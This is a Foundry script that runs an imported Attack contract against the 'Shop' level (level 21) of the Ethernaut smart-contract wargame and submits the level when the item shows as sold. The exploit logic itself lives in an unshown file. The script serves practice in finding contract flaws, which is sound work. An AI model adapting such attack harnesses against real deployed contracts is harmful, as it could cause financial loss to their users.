// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Shop} from "../src/Level21.sol";
import {Attack} from "../src/Level21Attack.sol";

contract Level21 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Shop instance = Shop(vm.envAddress("LVL21_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        attack.attackShop(instance);

        if (instance.isSold()) {
            console2.log("Level21: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level21: Failed");
        }

        vm.stopBroadcast();
    }
}
